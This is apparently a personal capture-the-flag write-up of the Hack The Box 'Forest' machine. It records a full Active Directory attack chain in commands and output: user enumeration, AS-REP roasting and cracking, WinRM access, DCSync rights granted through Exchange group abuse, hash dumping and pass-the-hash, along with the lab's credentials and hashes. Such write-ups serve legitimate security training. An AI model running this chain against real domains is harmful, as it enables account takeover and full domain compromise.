#CTF

# Given

> Forest is an easy Windows machine that showcases a Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC allows anonymous LDAP binds, which are used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system.

## IP

10.10.10.161

# What I Learnt

# Steps

## Enumeration

I started with a portscan to get a rough idea of what's running on this box.

```bash fold
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 64
88/tcp    open  kerberos-sec   syn-ack ttl 64
135/tcp   open  msrpc          syn-ack ttl 64
139/tcp   open  netbios-ssn    syn-ack ttl 64
389/tcp   open  ldap           syn-ack ttl 64
445/tcp   open  microsoft-ds   syn-ack ttl 64
464/tcp   open  kpasswd5       syn-ack ttl 64
593/tcp   open  http-rpc-epmap syn-ack ttl 64
636/tcp   open  ldapssl        syn-ack ttl 64
5985/tcp  open  wsman          syn-ack ttl 64
9389/tcp  open  adws           syn-ack ttl 64
47001/tcp open  winrm          syn-ack ttl 64
```

The nmap scan was running on the side, and I was scanning all ports for scripts and versions. I wanted to see if the two scans would help me quickly identify the running services.

```bash fold
PORT      ST
ATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-22 05:20:57Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site
: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site
: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The next step was for me to list down all the open ports, and the services running on them

```bash
- DNS(53)
- Kerberos(88)
- RPC(135)
- LDAP(389)
- SMB(445)
- WinRm(47001)
- HTTP(5985)
```

Next was checking for null authentication. There were two services I could attempt to get info from with null authentication. SMB and LDAP. 

![](Assets/Pasted%20image%2020250722135618.png)

There weren't any shares that were accessible without credentials, so I tried to enumerate the users of this system.

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# nxc smb 10.10.10.161 -u '' -p '' --users
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\:
SMB         10.10.10.161    445    FOREST           -Username-                    -Last PW Set-       -BadPW- -DescriptionSMB         10.10.10.161    445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain
SMB         10.10.10.161    445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.161    445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account
SMB         10.10.10.161    445    FOREST           DefaultAccount                <never>             0       A user account managed by the system.
SMB         10.10.10.161    445    FOREST           $331000-VK4ADACQNUCA          <never>             0
SMB         10.10.10.161    445    FOREST           SM_2c8eef0a09b545acb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0
SMB         10.10.10.161    445    FOREST           SM_75a538d3025e4db9a          <never>             0
SMB         10.10.10.161    445    FOREST           SM_681f53d4942840e18          <never>             0
SMB         10.10.10.161    445    FOREST           SM_1b41c9286325456bb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_9b69f1b9d2cc45549          <never>             0
SMB         10.10.10.161    445    FOREST           SM_7c96b981967141ebb          <never>             0
SMB         10.10.10.161    445    FOREST           SM_c75ee099d0a64c91b          <never>             0
SMB         10.10.10.161    445    FOREST           SM_1ffab36a2f5f479cb          <never>             0
SMB         10.10.10.161    445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0
SMB         10.10.10.161    445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0
SMB         10.10.10.161    445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0
SMB         10.10.10.161    445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0
SMB         10.10.10.161    445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0
SMB         10.10.10.161    445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0
SMB         10.10.10.161    445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0
SMB         10.10.10.161    445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0
SMB         10.10.10.161    445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0
SMB         10.10.10.161    445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0
SMB         10.10.10.161    445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0
SMB         10.10.10.161    445    FOREST           sebastien                     2019-09-20 00:29:59 0
SMB         10.10.10.161    445    FOREST           lucinda                       2019-09-20 00:44:13 0
SMB         10.10.10.161    445    FOREST           svc-alfresco                  2025-07-22 05:49:29 0
SMB         10.10.10.161    445    FOREST           andy                          2019-09-22 22:44:16 0
SMB         10.10.10.161    445    FOREST           mark                          2019-09-20 22:57:30 0
SMB         10.10.10.161    445    FOREST           santi                         2019-09-20 23:02:55 0
SMB         10.10.10.161    445    FOREST           [*] Enumerated 31 local users: HTB
```

Ignoring all the HealthMailbox accounts, and the ones with SM_* , I could get a decent user list to try and check for vulnerabilities.

I had to clean it up first. Vim and Regex are quite handy for this.

![](Assets/Pasted%20image%2020250722144245.png)

I needed to get some sort of credentials in order to find a foothold into the system, so I started checking for roastable accounts. 

Found one that was ASREP roastable : svc-alfresco, and netexec managed to grab the kerberos hash.

![](Assets/Pasted%20image%2020250722144220.png)

```bash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:a087354c786ddbd08a1995359f7e7555$f2d181183ae227436547fefbf1feaecf24f63031c113506c88f4f3e32f398edf0a7d0ff34c8d0859e43d841d3107924e47586a89024b503c00253
9bb8f9551e0d5ea3ecddb0fc7052a5f59637168b217f2213ee2e240e4d05d5bd7f53ef6a69b79b2f79f81576e572094bb28a107127d1b8089bcac71994ba2080f21ec6e877d7c686cfb7444d4b14587e97332a590eead43673d76b4c4cc
9a4496c7015cdc6ed898895559d0e75245ff9ea485d8d687d5bb99f6f9c04e8402a7e24780f3280eab4ff1fe322e0edde884f7b2a046c2c6c29befa30d26ec6a3a4eecdd06e9d13d7e110a0eecd6
```

I needed to get cracking to see if I had a weak password on hand for the user svc-alfresco. I popped the hash into hashcat, and got the mode I was supposed to use to crack it, and went for a dictionary attack using the rockyou wordlist.

![](Assets/Pasted%20image%2020250722144529.png)

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# hashcat -m 18200 -a 0 enum/asrep.out /usr/share/wordlists/rockyou.txt
```

Pretty soon, I had a hit. The password for svc-alfresco was `s3rvice`

![](Assets/Pasted%20image%2020250722145052.png)

## Foothold

I validated the username/password combo, and checked for any shares we could get in at the same time.

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# nxc smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$            READ            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```

Since winrm was open and running, I tried getting into the system using the creds I had and using evil-winrm.

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

It worked, and the user flag was on the desktop.

## Getting Admin

Before getting into bloodhound, I tried enumerating the system I had gotten into using some default Powershell modules. It was then that I realized I need to make a cheatsheet for this as I didn't have one on hand. Some googling was done, and I got a bunch of details about the system, the groups and users. 

I decided to get bloodhound up and running because a visual representation is so much better than lines of text.

The first step was to netexec ldap and the bloodhound ingestor to grab information on the domain.

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# nxc ldap 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --bloodhound --collection All --dns-server 10.10.10.161
LDAP        10.10.10.161    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
LDAP        10.10.10.161    389    FOREST           [+] htb.local\svc-alfresco:s3rvice
LDAP        10.10.10.161    389    FOREST           Resolved collection methods: rdp, container, trusts, session, objectprops, dcom, psremote, localadmin, acl, group
LDAP        10.10.10.161    389    FOREST           Done in 00M 13S
LDAP        10.10.10.161    389    FOREST           Compressing output into /root/.nxc/logs/FOREST_10.10.10.161_2025-07-22_073729_bloodhound.zip

```

We mark the svc-alfresco account as something we've owned, and the goal is to get to Administrator. 

Using bloodhound I can see that svc-alfresco belongs to a few groups, and one of them (Account Operators) has the `GenericAll` permission over Exchange Windows Permissions. This in turn as `WriteDACL` permissions over the HTB.LOCAL domain which contains the admin account.

![](Assets/Pasted%20image%2020250722160026.png)

Given the information we've gleaned, the gameplan to get to admin is:

1. Add svc-alfresco to exchange windows permissions group (GenericAll permission)
2. Abuse WriteDACL permission to get control of the domain.
3. Dump the SAM registry and get the hashes for all the users of the domain.

I started by adding the svc-alfresco account to the Exchange Windows Permissions group with the [net](https://linux.die.net/man/8/net) tool.

```bash
## Add Mem

net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "SVC-ALFRESCO" -U "HTB.LOCAL"/"SVC-ALFRESCO"%"s3rvice" -S "10.10.10.161"

## Check Mems

net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL"/"SVC-ALFRESCO"%"s3rvice" -S "10.10.10.161"
```

![](Assets/Pasted%20image%2020250722161113.png)

I tried to use Impacket-DACLEdit to get DCSync Permissions, but I kept getting "host unreachable" no matter what I tried so I switched things up to BloodyAD.

```bash
bloodyAD --host "$10.10.10.161" -d "HTB.LOCAL" -u "svc-alfresco" -p "s3rvice" add dcsync "exchange windows permissions" "svc-alfresco"
```

![](Assets/Pasted%20image%2020250722163144.png)

Now that my account was able to DCSync, I used secretsdump to dump all the hashes out of the SAM (Security Account Manager)  registry.

```bash
impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'10.10.10.161'
```

![](Assets/Pasted%20image%2020250722163407.png)

I got all the NTLM hashes of the users in this domain. I was looking for administrator, so I grabbed the whole thing, and picked up the last part of the series of numbers, since the sam dumps hashes in the domain\uid: rid: LM : NT format.

I then proceeded to PassTheHash into the admin account with evil-winrm.

```bash
┌──(root㉿docker-desktop)-[/host_data/loot]
└─# evil-winrm -i 10.10.10.161 -u 'administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Root flag was on the desktop.

# Creds

**Basic Creds**
svc-alfresco : s3rvice

**Admin NTLM hash**
Administrator : aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

# Proof

![](Assets/Pasted%20image%2020250722145626.png)

![](Assets/Pasted%20image%2020250722163756.png)

# References

https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3#77e6